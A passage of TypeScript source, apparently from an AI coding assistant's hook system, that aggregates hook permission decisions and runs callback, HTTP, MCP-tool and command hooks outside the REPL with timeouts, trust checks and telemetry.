          `Hook ${hookEvent} (${getHookDisplayText(result.hook)}) provided sessionTitle (${[...result.sessionTitle].length} chars)`,
        )
        yield {
          sessionTitle: result.sessionTitle,
        }
      }

      if (result.reloadSkills) {
        logForDebugging(
          `Hook ${hookEvent} (${getHookDisplayText(result.hook)}) requested reloadSkills`,
        )
        yield {
          reloadSkills: true,
        }
      }

      if (result.suppressOriginalPrompt) {
        yield {
          suppressOriginalPrompt: true,
        }
      }

      if (result.watchPaths && result.watchPaths.length > 0) {
        logForDebugging(
          `Hook ${hookEvent} (${getHookDisplayText(result.hook)}) provided ${result.watchPaths.length} watchPaths`,
        )
        yield {
          watchPaths: result.watchPaths,
        }
      }

      if (result.updatedToolOutput !== undefined) {
        yield { updatedToolOutput: result.updatedToolOutput }
      } else if (result.updatedMCPToolOutput !== undefined) {
        yield { updatedMCPToolOutput: result.updatedMCPToolOutput }
      }
      const matchedEntry = matchingHooks.find(
        entry => entry.hook === result.hook,
      )
      enforceThroughFamilyOnlyHookResult(
        result,
        matchedEntry,
        hookEvent,
        getHookDisplayText(result.hook),
      )

      if (result.classifierContext) {
        let value = result.classifierContext.slice(0, 2000)
        const last = value.charCodeAt(value.length - 1)
        if (
          value.length < result.classifierContext.length &&
          last >= 0xd800 &&
          last <= 0xdbff
        ) {
          value = value.slice(0, -1)
        }
        const matched = matchingHooks.find(entry => entry.hook === result.hook)
        yield {
          pairedRewrite:
            result.updatedToolOutput !== undefined
              ? 'direct'
              : result.updatedMCPToolOutput !== undefined
                ? 'legacy_mcp'
                : result.legacyMcpRewriteSuppressed
                  ? 'suppressed'
                  : 'none',
          classifierContexts: [
            {
              value,
              hostPrincipal:
                result.hook.type === 'callback' &&
                matched !== undefined &&
                matched.pluginId === undefined &&
                matched.pluginRoot === undefined &&
                matched.skillRoot === undefined,
            },
          ],
        }
      }

      // densable QLn @185141233 — void allow before Y aggregation.
      stripEvalConfinedHookAllow(
        result,
        `Hook ${hookEvent} (${getHookDisplayText(result.hook)})`,
      )

      // Official Y: deny > defer > ask > allow
      if (result.permissionBehavior) {
        logForDebugging(
          `Hook ${hookEvent} (${getHookDisplayText(result.hook)}) returned permissionDecision: ${result.permissionBehavior}${result.hookPermissionDecisionReason ? ` (reason: ${result.hookPermissionDecisionReason})` : ''}`,
        )
        switch (result.permissionBehavior) {
          case 'deny':
            permissionBehavior = 'deny'
            break
          case 'defer':
            if (permissionBehavior !== 'deny') {
              permissionBehavior = 'defer'
            }
            break
          case 'ask':
            if (
              permissionBehavior !== 'deny' &&
              permissionBehavior !== 'defer'
            ) {
              permissionBehavior = 'ask'
            }
            break
          case 'allow':
            if (!permissionBehavior) {
              permissionBehavior = 'allow'
            }
            break
          case 'passthrough':
            break
        }
      }

      // Official: only yield when this hook currently holds Y.
      if (
        result.permissionBehavior &&
        permissionBehavior === result.permissionBehavior
      ) {
        const updatedInput =
          result.updatedInput &&
          (result.permissionBehavior === 'allow' ||
            result.permissionBehavior === 'ask')
            ? result.updatedInput
            : undefined
        if (updatedInput) {
          logForDebugging(
            `Hook ${hookEvent} (${getHookDisplayText(result.hook)}) modified tool input keys: [${Object.keys(updatedInput).join(', ')}]`,
          )
        }
        yield {
          permissionBehavior,
          hookPermissionDecisionReason: result.hookPermissionDecisionReason,
          hookSource: matchingHooks.find(m => m.hook === result.hook)
            ?.hookSource,
          updatedInput,
        }
      }

      // Yield updatedInput separately for passthrough case (no permission decision)
      // This allows hooks to modify input without making a permission decision
      // Note: Check result.permissionBehavior (this hook's behavior), not the aggregated permissionBehavior
      if (result.updatedInput && result.permissionBehavior === undefined) {
        logForDebugging(
          `Hook ${hookEvent} (${getHookDisplayText(result.hook)}) modified tool input keys: [${Object.keys(result.updatedInput).join(', ')}]`,
        )
        yield {
          updatedInput: result.updatedInput,
        }
      }
      // Yield permission request result if provided (from PermissionRequest hooks)
      if (result.permissionRequestResult) {
        yield {
          permissionRequestResult: result.permissionRequestResult,
        }
      }
      // Yield retry flag if provided (from PermissionDenied hooks)
      if (result.retry) {
        yield {
          retry: result.retry,
        }
      }
      // Yield elicitation response if provided (from Elicitation hooks)
      if (result.elicitationResponse) {
        yield {
          elicitationResponse: result.elicitationResponse,
        }
      }
      // Yield elicitation result response if provided (from ElicitationResult hooks)
      if (result.elicitationResultResponse) {
        yield {
          elicitationResultResponse: result.elicitationResultResponse,
        }
      }

      // Invoke session hook callback if this is a command/prompt/function hook (not a callback hook)
      if (appState && result.hook.type !== 'callback') {
        const sessionId = getSessionId()
        // Use empty string as matcher when matchQuery is undefined (e.g., for Stop hooks)
        const matcher = matchQuery ?? ''
        const hookEntry = getSessionHookCallback(
          appState,
          sessionId,
          hookEvent,
          matcher,
          result.hook,
        )
        // Invoke onHookSuccess only on success outcome
        if (hookEntry?.onHookSuccess && result.outcome === 'success') {
          try {
            hookEntry.onHookSuccess(result.hook, result as AggregatedHookResult)
          } catch (error) {
            logError(
              Error('Session hook success callback failed', { cause: error }),
            )
          }
        }
      }
    }
  } finally {
    progress?.[Symbol.dispose]()
  }

  const totalDurationMs = Date.now() - batchStartTime
  getStatsStore()?.observe('hook_duration_ms', totalDurationMs)
  addToTurnHookDuration(totalDurationMs)

  logEvent(`tengu_repl_hook_finished`, {
    hookName:
      hookName as AnalyticsMetadata_I_VERIFIED_THIS_IS_NOT_CODE_OR_FILEPATHS,
    numCommands: matchingHooks.length,
    numSuccess: outcomes.success,
    numBlocking: outcomes.blocking,
    numNonBlockingError: outcomes.non_blocking_error,
    numCancelled: outcomes.cancelled,
    totalDurationMs,
  })

  // Log hook execution completion to OTEL (only for beta tracing)
  if (isBetaTracingEnabled()) {
    const hookDefinitionsComplete =
      getHookDefinitionsForTelemetry(matchingHooks)

    void logOTelEvent('hook_execution_complete', {
      hook_event: hookEvent,
      hook_name: hookName,
      num_hooks: String(matchingHooks.length),
      num_success: String(outcomes.success),
      num_blocking: String(outcomes.blocking),
      num_non_blocking_error: String(outcomes.non_blocking_error),
      num_cancelled: String(outcomes.cancelled),
      managed_only: String(shouldAllowManagedHooksOnly()),
      hook_definitions: jsonStringify(hookDefinitionsComplete),
      hook_source: shouldAllowManagedHooksOnly() ? 'policySettings' : 'merged',
    })
  }

  // End hook span for beta tracing
  endHookSpan(hookSpan, {
    numSuccess: outcomes.success,
    numBlocking: outcomes.blocking,
    numNonBlockingError: outcomes.non_blocking_error,
    numCancelled: outcomes.cancelled,
  })
}

function holdOutsideHookActivity(
  event: HookEvent,
  hooks: MatchedHook[],
  timeoutMs: number,
): () => void {
  let bound: number
  try {
    if (
      [
        'MessageDisplay',
        'SessionEnd',
        'PermissionRequest',
        'Notification',
      ].includes(event) ||
      !process.env.CLAUDE_CODE_REMOTE_SEND_KEEPALIVES ||
      !getFeatureValue_CACHED_MAY_BE_STALE(
        'tengu_ccr_hook_keepalive_enabled',
        false,
      )
    )
      return () => {}
    const maxTimeout = Math.max(
      ...hooks.map(({ hook }) =>
        hook.type === 'function'
          ? (hook.timeout ?? timeoutMs)
          : hook.type === 'prompt' || hook.type === 'agent'
            ? resolveModelHookTimeoutMs(hook, timeoutMs)
            : hook.timeout
              ? hook.timeout * 1000
              : timeoutMs,
      ),
    )
    bound = Math.min(maxTimeout + 60000, 1200000)
  } catch (error) {
    logError(error)
    return () => {}
  }
  let active = false
  let timer: ReturnType<typeof setTimeout> | undefined
  const release = () => {
    if (!active) return
    active = false
    try {
      clearTimeout(timer)
      stopSessionActivity('hook_exec', 'hook-dispatch-hold')
    } catch (error) {
      logError(error)
    }
  }
  try {
    startSessionActivity('hook_exec', 'hook-dispatch-hold')
    active = true
    const maxMs = Number.isFinite(bound) ? bound : 1200000
    timer = setTimeout(() => {
      logForDiagnosticsNoPII('warn', 'session_activity_hook_hold_expired', {
        max_ms: maxMs,
      })
      release()
    }, maxMs)
    timer.unref()
    return release
  } catch (error) {
    logError(error)
    release()
    return () => {}
  }
}

function getHookWorktreePath(
  results: HookOutsideReplResult[],
): string | undefined {
  return results
    .filter(result => result.succeeded)
    .map(
      result =>
        stripAnsi(result.output)
          .split('\n')
          .map(line => line.trim())
          .filter(Boolean)
          .at(-1) ?? '',
    )
    .find(path => path.length > 0)
}

function getOutsideHookFields(
  results: HookOutsideReplResult[],
  event: HookEvent,
): Record<string, unknown> {
  const block = results.find(result => result.blocked)?.output
  const worktreePath =
    event === 'WorktreeCreate' ? getHookWorktreePath(results) : undefined
  return {
    ...(block !== undefined && { block }),
    ...(worktreePath !== undefined && { worktreePath }),
  }
}

function consumeOutsideHookOutput(
  json: HookJSONOutput | undefined,
  hookName: string,
): void {
  if (!json || !isSyncHookJSONOutput(json) || !json.terminalSequence) return
  const allowed = parseAllowedTerminalSequence(json.terminalSequence)
  if (allowed !== null) emitTerminalSequence(allowed)
  else
    logForDebugging(
      `Hook ${hookName} returned a terminalSequence that was rejected by the allowlist (only OSC 0/1/2/9/99/777 and BEL are permitted, and OSC 9 bodies may not begin with a digit unless in the 9;4 progress form)`,
    )
}

export function hasBlockingResult(results: HookOutsideReplResult[]): boolean {
  return results.some(r => r.blocked)
}

/**
 * Execute hooks outside of the REPL (e.g. notifications, session end)
 *
 * Unlike executeHooks() which yields messages that are exposed to the model as
 * system messages, this function only logs errors via logForDebugging (visible
 * with --debug). Callers that need to surface errors to users should handle
 * the returned results appropriately (e.g. executeSessionEndHooks writes to
 * stderr during shutdown).
 *
 * @param getAppState Optional function to get the current app state (for session hooks)
 * @param hookInput The structured hook input that will be validated and converted to JSON
 * @param matchQuery The query to match against hook matchers
 * @param signal Optional AbortSignal to cancel hook execution
 * @param timeoutMs Optional timeout in milliseconds for hook execution
 * @returns Array of HookOutsideReplResult objects containing command, succeeded, and output
 */
async function executeHooksOutsideREPL({
  getAppState,
  hookInput,
  matchQuery,
  signal,
  timeoutMs = TOOL_HOOK_EXECUTION_TIMEOUT_MS,
  storageV5,
  credentials,
  classicChainMember,
  managedHooksOnly,
  managedHooksExcluded,
  agentId,
}: {
  agentId?: string
  managedHooksOnly?: boolean
  managedHooksExcluded?: boolean
  getAppState?: () => AppState
  hookInput: HookInput
  matchQuery?: string
  signal?: AbortSignal
  timeoutMs: number
  classicChainMember?: boolean
  /** densable Fd persist — last two kwe args (jIs / Nw). */
  storageV5?: unknown
  credentials?: unknown
}): Promise<HookOutsideReplResult[]> {
  if (isEnvTruthy(process.env.CLAUDE_CODE_SIMPLE)) {
    return []
  }

  const hookEvent = hookInput.hook_event_name
  const hookName = matchQuery ? `${hookEvent}:${matchQuery}` : hookEvent
  if (
    !classicChainMember &&
    !managedHooksOnly &&
    !shouldDisableAllHooksIncludingManaged() &&
    hasMatchingFunctionHook(hookEvent)
  ) {
    const collected: HookOutsideReplResult[] = []
    const returned = await runFunctionHookChain(
      hookEvent,
      hookInput as unknown as Record<string, unknown>,
      async event => {
        const downstream = await executeHooksOutsideREPL({
          getAppState,
          hookInput: event as HookInput,
          matchQuery,
          signal,
          timeoutMs,
          storageV5,
          credentials,
          agentId,
          classicChainMember: true,
          managedHooksExcluded: true,
        })
        collected.push(...downstream)
        return getOutsideHookFields(downstream, hookEvent)
      },
      undefined,
      undefined,
      {
        signal,
        site: CLASSIC_HOOK_HOP_SITE,
        handlersBefore: [
          {
            name: 'managed',
            isManaged: true,
            async run(event, next) {
              const managed = managedHooksExcluded
                ? []
                : await executeHooksOutsideREPL({
                    getAppState,
                    hookInput: event as HookInput,
                    matchQuery,
                    signal,
                    timeoutMs,
                    storageV5,
                    credentials,
                    agentId,
                    classicChainMember: true,
                    managedHooksOnly: true,
                  })
              collected.push(...managed)
              const fields = getOutsideHookFields(managed, hookEvent)
              if (fields.block !== undefined) return fields
              const downstream = await next(event)
              return mergeManagedAndDownstreamClassicEvent(
                fields,
                downstream && typeof downstream === 'object'
                  ? (downstream as Record<string, unknown>)
                  : {},
              )
            },
          },
        ],
      },
    )
    if (!returned || typeof returned !== 'object') return collected
    const event = returned as Record<string, unknown>
    const baseline = getOutsideHookFields(collected, hookEvent)
    const originalBlock = baseline.block
    const originalPath = baseline.worktreePath
    let results = collected
    if (event.block !== originalBlock) {
      results = results.filter(result => !result.blocked)
      if (event.block !== undefined)
        results.push({
          command: `classic.${hookEvent} hook`,
          succeeded: false,
          blocked: true,
          output: String(event.block),
        })
    }
    if (hookEvent === 'WorktreeCreate' && event.worktreePath !== originalPath) {
      results = results.filter(
        result => getHookWorktreePath([result]) === undefined,
      )
      if (typeof event.worktreePath === 'string')
        results.push({
          command: `classic.${hookEvent} hook`,
          succeeded: true,
          blocked: false,
          output: event.worktreePath,
        })
    }
    return results
  }

  // SECURITY: ALL hooks require workspace trust in interactive mode
  // This centralized check prevents RCE vulnerabilities for all current and future hooks
  if (shouldSkipHookDueToTrust()) {
    logForDebugging(
      `Skipping ${hookName} hook execution - workspace trust not accepted`,
    )
    return []
  }

  const appState = getAppState ? getAppState() : undefined
  // Use main session ID for outside-REPL hooks
  const sessionId = getSessionId()
  const matchingHooks = await getMatchingHooks(
    appState,
    sessionId,
    hookEvent,
    hookInput,
    undefined,
    { managedHooksOnly, managedHooksExcluded },
  ).catch(error => {
    logError(new Error('Failed to match hooks', { cause: error }))
    logEvent('tengu_feature_bad', {
      feature_name: hookTelemetryFeatureName(
        hookEvent,
      ) as AnalyticsMetadata_I_VERIFIED_THIS_IS_NOT_CODE_OR_FILEPATHS,
      error_code:
        'hook_matching_failed' as AnalyticsMetadata_I_VERIFIED_THIS_IS_NOT_CODE_OR_FILEPATHS,
    })
    if (shouldFailClosedHookInput(hookEvent)) throw error
    return []
  })
  if (matchingHooks.length === 0) {
    return []
  }

  if (signal?.aborted) {
    return []
  }

  const userHooks = matchingHooks.filter(h => !isInternalHook(h))
  if (userHooks.length > 0) {
    const pluginHookCounts = getPluginHookCounts(userHooks)
    const hookTypeCounts = getHookTypeCounts(userHooks)
    logEvent(`tengu_run_hook`, {
      hookName:
        hookName as AnalyticsMetadata_I_VERIFIED_THIS_IS_NOT_CODE_OR_FILEPATHS,
      numCommands: userHooks.length,
      numMatchAllMatchers: userHooks.filter(hook => hook.matcherIsMatchAll)
        .length,
      numSpecificMatchers: userHooks.filter(hook => !hook.matcherIsMatchAll)
        .length,
      hookTypeCounts: jsonStringify(
        hookTypeCounts,
      ) as AnalyticsMetadata_I_VERIFIED_THIS_IS_NOT_CODE_OR_FILEPATHS,
      ...(pluginHookCounts && {
        pluginHookCounts: jsonStringify(
          pluginHookCounts,
        ) as AnalyticsMetadata_I_VERIFIED_THIS_IS_NOT_CODE_OR_FILEPATHS,
      }),
    })
  }

  // Validate and stringify the hook input
  let jsonInput: string
  try {
    jsonInput = jsonStringify(hookInput)
    validateHookInputSize(hookEvent, jsonInput)
  } catch (error) {
    logError(error)
    logEvent('tengu_feature_bad', {
      feature_name: hookTelemetryFeatureName(
        hookEvent,
      ) as AnalyticsMetadata_I_VERIFIED_THIS_IS_NOT_CODE_OR_FILEPATHS,
      error_code: (error instanceof RangeError &&
      error.message === 'Hook input is over the size limit'
        ? 'hook_input_too_large'
        : 'hook_input_stringify_failed') as AnalyticsMetadata_I_VERIFIED_THIS_IS_NOT_CODE_OR_FILEPATHS,
    })
    if (shouldFailClosedHookInput(hookEvent)) throw error
    return []
  }

  let failureReason: string | undefined
  let callbackCancelled = false
  let schemaInvalidBlocked = false
  const releaseHold =
    userHooks.length > 0
      ? holdOutsideHookActivity(hookEvent, matchingHooks, timeoutMs)
      : () => {}
  const progress =
    userHooks.length > 0
      ? trackHookExecution({
          hookEvent,
          agentId,
          toolName: 'tool_name' in hookInput ? hookInput.tool_name : undefined,
          hooks: userHooks.map(({ hook }) => ({
            command: formatHookProgressText(getHookDisplayText(hook)),
            statusMessage:
              'statusMessage' in hook && hook.statusMessage
                ? formatHookProgressText(hook.statusMessage)
                : undefined,
          })),
        })
      : undefined
  const progressIndices = new Map(
    userHooks.map(({ hook }, index) => [hook, index]),
  )
  // Run all hooks in parallel with individual timeouts
  const hookPromises = matchingHooks.map(
    async (
      { hook, pluginRoot, pluginId, skillRoot, projectRoot },
      hookIndex,
    ) => {
      // Gold289 SKo/_Ko are fixed false/null in this build: no usable
      // working-copy host exists for a matcher that pins a project root.
      if (projectRoot !== undefined) {
        failureReason ??= 'hook_did_not_run'
        const output = `not run: it came from ${projectRoot}, which is no longer a working copy this session can use, and the session's directory is not in one either`
        logForDebugging(
          `Hooks: ${getHookDisplayText(hook)} for ${hookEvent} ${output}`,
          { level: 'warn' },
        )
        return {
          command: getHookDisplayText(hook),
          succeeded: false,
          output,
          blocked: false,
        }
      }
      // Handle callback hooks
      if (hook.type === 'callback') {
        const callbackTimeoutMs = hook.timeout ? hook.timeout * 1000 : timeoutMs
        const { signal: abortSignal, cleanup } = createCombinedAbortSignal(
          signal,
          { timeoutMs: callbackTimeoutMs },
        )

        try {
          const toolUseID = randomUUID()
          const json = await hook.callback(
            hookInput,
            toolUseID,
            abortSignal,
            hookIndex,
          )

          cleanup?.()

          if (isAsyncHookJSONOutput(json)) {
            logForDebugging(
              `${hookName} [callback] returned async response, returning empty output`,
            )
            return {
              command: 'callback',
              succeeded: true,
              output: '',
              blocked: false,
            }
          }

          const typedJson = json as TypedSyncHookOutput
          const output =
            hookEvent === 'WorktreeCreate' &&
            isSyncHookJSONOutput(json) &&
            typedJson.hookSpecificOutput?.hookEventName === 'WorktreeCreate'
              ? typedJson.hookSpecificOutput.worktreePath
              : typedJson.systemMessage || ''
          const blocked =
            isSyncHookJSONOutput(json) && typedJson.decision === 'block'

          consumeOutsideHookOutput(json, hookName)
          logForDebugging(`${hookName} [callback] completed successfully`)

          return {
            command: 'callback',
            succeeded: true,
            output,
            blocked,
          }
        } catch (error) {
          cleanup?.()
          if (isAbortError(error)) {
            const cancelled =
              error instanceof ControlStreamClosedError || !!signal?.aborted
            if (cancelled) callbackCancelled = true
            else failureReason ??= 'hook_callback_timeout'
            logForDebugging(
              cancelled
                ? error instanceof ControlStreamClosedError
                  ? `${hookName} [callback] cancelled (control stream closed)`
                  : `${hookName} [callback] cancelled`
                : `${hookName} [callback] timed out`,
              cancelled ? undefined : { level: 'error' },
            )
            return {
              command: 'callback',
              succeeded: false,
              output: '',
              blocked: false,
              ...(cancelled && { cancelled: true }),
            }
          }

          const errorMessage =
            error instanceof Error ? error.message : String(error)
          failureReason ??= 'hook_callback_failed'
          logForDebugging(
            `${hookName} [callback] failed to run: ${errorMessage}`,
            { level: 'error' },
          )
          return {
            command: 'callback',
            succeeded: false,
            output: errorMessage,
            blocked: false,
          }
        }
      }

      // Gold289 deliberately does not run prompt hooks outside REPL.
      if (hook.type === 'prompt') {
        failureReason ??= 'hook_type_unsupported'
        return {
          command: hook.prompt,
          succeeded: false,
          output: 'Prompt stop hooks are not yet supported outside REPL',
          blocked: false,
        }
      }

      // Gold289 deliberately does not run agent hooks outside REPL.
      if (hook.type === 'agent') {
        failureReason ??= 'hook_type_unsupported'
        return {
          command: hook.prompt,
          succeeded: false,
          output: 'Agent stop hooks are not yet supported outside REPL',
          blocked: false,
        }
      }

      // Function hooks require messages array (only available in REPL context)
      // For -p mode Stop hooks, use executeStopHooks which supports function hooks
      if (hook.type === 'function') {
        failureReason ??= 'hook_type_unsupported'
        logError(
          new Error(
            `Function hook reached executeHooksOutsideREPL for ${hookEvent}. Function hooks should only be used in REPL context (Stop hooks).`,
          ),
        )
        return {
          command: 'function',
          succeeded: false,
          output: 'Internal error: function hook executed outside REPL context',
          blocked: false,
        }
      }

      // Handle HTTP hooks (no toolUseContext needed - just HTTP POST).
      // execHttpHook handles its own timeout internally via hook.timeout or
      // DEFAULT_HTTP_HOOK_TIMEOUT_MS, so we pass signal directly.
      if (hook.type === 'http' || hook.type === 'mcp_tool') {
        try {
          const httpResult: {
            ok: boolean
            body: string
            error?: string
            aborted?: boolean
            withheld?: boolean
            statusCode?: number
          } =
            hook.type === 'http'
              ? await execHttpHook(
                  hook,
                  hookEvent,
                  jsonInput,
                  signal,
                  timeoutMs,
                )
              : await execMcpToolHook(
                  hook,
                  hookEvent,
                  jsonInput,
                  getAppState?.().mcp.clients,
                  signal,
                  timeoutMs,
                )

          if (httpResult.aborted) {
            failureReason ??= 'hook_cancelled'
            logForDebugging(
              `${hookName} [${getHookDisplayText(hook)}] cancelled`,
            )
            return {
              command: getHookDisplayText(hook),
              succeeded: false,
              output: 'Hook cancelled',
              blocked: false,
              ...(signal?.aborted && { cancelled: true }),
            }
          }

          if (httpResult.error || !httpResult.ok) {
            failureReason ??=
              hook.type === 'http'
                ? 'hook_http_request_failed'
                : 'hook_mcp_tool_failed'
            const errMsg =
              httpResult.error ||
              (hook.type === 'mcp_tool'
                ? 'MCP tool returned an error'
                : `HTTP ${httpResult.statusCode} from ${getHookDisplayText(hook)}`)
            logForDebugging(
              `${hookName} [${getHookDisplayText(hook)}] failed: ${errMsg}`,
              {
                level: 'error',
              },
            )
            return {
              command: getHookDisplayText(hook),
              succeeded: false,
              output: errMsg,
              blocked: false,
            }
          }

          // HTTP hooks must return JSON — parse and validate through Zod
          const { json: httpJson, validationError: httpValidationError } =
            hook.type === 'http'
              ? parseHttpHookOutput(httpResult.body)
              : parseHookOutput(httpResult.body)
          if (httpValidationError) {
            throw new Error(httpValidationError)
          }
          if (httpJson && !isAsyncHookJSONOutput(httpJson)) {
            logForDebugging(
              `Parsed JSON output from HTTP hook: ${jsonStringify(httpJson)}`,
              { level: 'verbose' },
            )
          }
          const typedHttpJson = httpJson as TypedSyncHookOutput | undefined
          const jsonBlocked =
            httpJson &&
            !isAsyncHookJSONOutput(httpJson) &&
            isSyncHookJSONOutput(httpJson) &&
            typedHttpJson?.decision === 'block'

          // WorktreeCreate's consumer reads `output` as the bare filesystem
          // path. Command hooks provide it via stdout; http hooks provide it
          // via hookSpecificOutput.worktreePath. Without worktreePath, emit ''
          // so the consumer's length filter skips it instead of treating the
          // raw '{}' body as a path.
          const output = jsonBlocked
            ? typedHttpJson?.reason || ''
            : hook.type === 'http' && hookEvent === 'WorktreeCreate'
              ? httpJson &&
                isSyncHookJSONOutput(httpJson) &&
                typedHttpJson?.hookSpecificOutput?.hookEventName ===
                  'WorktreeCreate'
                ? typedHttpJson.hookSpecificOutput.worktreePath
                : ''
              : httpResult.body

          consumeOutsideHookOutput(httpJson, hookName)
          const syncJson =
            httpJson && isSyncHookJSONOutput(httpJson)
              ? typedHttpJson
              : undefined
          return {
            command: getHookDisplayText(hook),
            succeeded: true,
            output,
            blocked: !!jsonBlocked,
            ...(hook.type === 'mcp_tool' && {
              watchPaths:
                syncJson?.hookSpecificOutput &&
                'watchPaths' in syncJson.hookSpecificOutput
                  ? syncJson.hookSpecificOutput.watchPaths
                  : undefined,
            }),
            systemMessage: syncJson?.systemMessage,
          }
        } catch (error) {
          const errorMessage =
            error instanceof Error ? error.message : String(error)
          failureReason ??=
            hook.type === 'http'
              ? 'hook_http_exec_failed'
              : 'hook_mcp_exec_failed'
          logForDebugging(
            `${hookName} [${getHookDisplayText(hook)}] failed to run: ${errorMessage}`,
            { level: 'error' },
          )
          return {
            command: getHookDisplayText(hook),
            succeeded: false,
            output: errorMessage,
            blocked: false,
          }
        }
      }

      // Handle command hooks
      const commandText = getHookDisplayText(hook)
      let exitedBlocking = false
      const hookStartMs = Date.now()
      const commandTimeoutMs = hook.timeout ? hook.timeout * 1000 : timeoutMs
      const { signal: abortSignal, cleanup } = createCombinedAbortSignal(
        signal,
        { timeoutMs: commandTimeoutMs },
      )
      try {
        const result = await execCommandHook(
          hook,
          hookEvent,
          hookName,
          jsonInput,
          abortSignal,
          randomUUID(),
          hookIndex,
          pluginRoot,
          pluginId,
          skillRoot,
          shouldBlockOnFailureForEvent(
            hook as HookWithOnFailure,
            hookEvent as HookEvent,
          ),
          undefined,
          storageV5,
          credentials,
        )

        exitedBlocking = result.status === 2 && !result.backgrounded
        // Clear timeout if hook completes
        cleanup?.()
        const durationMs = Date.now() - hookStartMs
        logForDebugging(
          formatHookCompletionDebugLog({
            hookName,
            command: commandText,
            pluginId,
            result,
            timeoutMs: commandTimeoutMs,
            durationMs,
            parentAborted: signal?.aborted === true,
          }),
        )

        if (result.aborted) {
          const commandResult = result as HookCommandResult & {
            stoppedAfterItsTimeout?: boolean
          }
          const abortedByParent =
            signal?.aborted === true &&
            commandResult.stoppedAfterItsTimeout !== true
          failureReason ??= 'hook_cancelled'
          return {
            command: commandText,
            succeeded: false,
            output: 'Hook cancelled',
            blocked: false,
            ...(abortedByParent && { cancelled: true }),
          }
        }

        // Parse JSON for any messages to print out.
        // densable 2.1.214 #40: `if(L&&k.status!==2)throw Error(L)` — schema
        // failure must not override exit code 2 blocking.
        const parsed = parseHookOutput(result.stdout)
        const { validationError } = parsed
        const json = selectCompleteHookOutput(result, hookEvent, parsed.json)
        const stdioError = getHookStdioError(
          result,
          hookEvent,
          json,
          text => parseHookOutput(text).json,
        )
        if (stdioError !== undefined) {
          failureReason ??= 'hook_stdio_incomplete'
          return {
            command: commandText,
            succeeded: false,
            output: Uct(stdioError, result.status, result.stderr),
            blocked: stdioFailClosedEvents.has(hookEvent),
          }
        }
        if (validationError && result.status === 2) schemaInvalidBlocked = true
        else if (validationError) {
          failureReason ??= 'hook_output_schema_invalid'
          // densable 2.1.248: throw Error(Uct(xt, status, stderr))
          throw new Error(Uct(validationError, result.status, result.stderr))
        }
        if (json && !isAsyncHookJSONOutput(json)) {
          logForDebugging(
            `Parsed JSON output from hook: ${jsonStringify(json)}`,
            { level: 'verbose' },
          )
        }

        consumeOutsideHookOutput(json, hookName)
        // Blocked if exit code 2 or JSON decision: 'block'
        const typedJson = json as TypedSyncHookOutput | undefined
        const jsonBlocked =
          json &&
          !isAsyncHookJSONOutput(json) &&
          isSyncHookJSONOutput(json) &&
          typedJson?.decision === 'block'
        const blocked = result.status === 2 || !!jsonBlocked

        // densable: block path uses decision reason or stderr; exit 2 keeps stderr
        // even when stdout JSON schema failed (json ignored / absent).
        const output = jsonBlocked
          ? typedJson?.reason || result.stderr || ''
          : result.status === 0
            ? result.stdout || ''
            : result.stderr || ''

        const watchPaths =
          json &&
          isSyncHookJSONOutput(json) &&
          typedJson?.hookSpecificOutput &&
          'watchPaths' in typedJson.hookSpecificOutput
            ? (typedJson.hookSpecificOutput as { watchPaths?: string[] })
                .watchPaths
            : undefined

        const systemMessage =
          json && isSyncHookJSONOutput(json)
            ? typedJson?.systemMessage
            : undefined

        if (result.status !== 0 && !blocked)
          failureReason ??= 'hook_nonzero_exit'
        return {
          command: commandText,
          succeeded: result.status === 0,
          output,
          blocked,
          ...(result.exitedNormally && { exitCode: result.status }),
          watchPaths,
          systemMessage,
        }
      } catch (error) {
        // Clean up on error
        cleanup?.()

        const errorMessage =
          error instanceof Error ? error.message : String(error)
        failureReason ??= 'hook_exec_failed'
        logForDebugging(
          `${hookName} [${commandText}] failed to run: ${errorMessage}`,
          { level: 'error' },
        )
        return {
          command: commandText,
          succeeded: false,
          output: errorMessage,
          blocked:
            exitedBlocking &&
            (hookEvent === 'PreToolUse' || hookEvent === 'PermissionRequest'),
        }
      }
    },
  )

  const results = await Promise.all(
    hookPromises.map((promise, index) => {
      const hook = matchingHooks[index]?.hook
      return promise
        .then(res =>
          hook
            ? applyOnFailureBlockToAggregatedHookResult(
                hook as HookWithOnFailure,
                res,
                hookEvent,
              )
            : res,
        )
        .finally(() => {
          const progressIndex = hook ? progressIndices.get(hook) : undefined
          if (progressIndex !== undefined) progress?.settle(progressIndex)
        })
    }),
  ).finally(() => {
    progress?.[Symbol.dispose]()
    releaseHold()
  })
  logEvent(
    failureReason
      ? 'tengu_feature_bad'
      : callbackCancelled || schemaInvalidBlocked
        ? 'tengu_feature_sad'
        : 'tengu_feature_ok',
    {
      feature_name: hookTelemetryFeatureName(
        hookEvent,
      ) as AnalyticsMetadata_I_VERIFIED_THIS_IS_NOT_CODE_OR_FILEPATHS,
      ...(failureReason || callbackCancelled || schemaInvalidBlocked
        ? {
            error_code: (failureReason ??
              (callbackCancelled
                ? 'hook_cancelled'
                : 'hook_output_schema_invalid_blocked')) as AnalyticsMetadata_I_VERIFIED_THIS_IS_NOT_CODE_OR_FILEPATHS,
          }
        : {}),
    },
  )
  for (const pluginId of new Set(matchingHooks.map(hook => hook.pluginId))) {
    if (pluginId) incrementPluginUsage(pluginId)
  }
  return results
}

function getToolHookMcpMetadata(
  toolName: string,
  context: ToolUseContext,
): {
  mcp_server?: { name: string; source: string }
} {
  const info = findToolByName(context.options.tools, toolName)?.mcpInfo
  if (!info) return {}
  const client = context.options.mcpClients?.find(
    entry => entry.name === info.serverName,
  )
  return {
    mcp_server: {
      name: info.serverName,
      source:
        info.source ??
        (('pluginTelemetry' in info && info.pluginTelemetry !== undefined) ||
        ((info.scope ?? 'dynamic') === 'dynamic' &&
          ownerOfPluginToolServerKey(info.serverName) !== undefined)
          ? 'plugin'
          : (
                'serverType' in info
                  ? info.serverType === 'sdk'
                  : client?.config.type === 'sdk'
              )
            ? 'sdk'
            : (info.scope ?? 'dynamic')),
    },
  }
}

/**
 * densable `Nx` / `jbe`. Skip JSON tool hooks when settingsHooksOff, bareFork,
 * or the tool is non-MCP EndConversation.
 */
function shouldSkipJsonToolHooks(
  toolName: string,
  context: ToolUseContext,
): boolean {
  if (context.options.settingsHooksOff === true) {
    return true
  }
  if (context.options.bareFork === true) {
    return true
  }
  const tool = findToolByName(context.options.tools, toolName)
  return (
    tool !== undefined &&
    tool.mcpInfo === undefined &&
    tool.name === END_CONVERSATION_TOOL_NAME
  )
}

export async function* executePreToolHooks<ToolInput>(
  toolName: string,
  toolUseID: string,
  toolInput: ToolInput,
  toolUseContext: ToolUseContext,
  permissionMode?: string,
  signal?: AbortSignal,
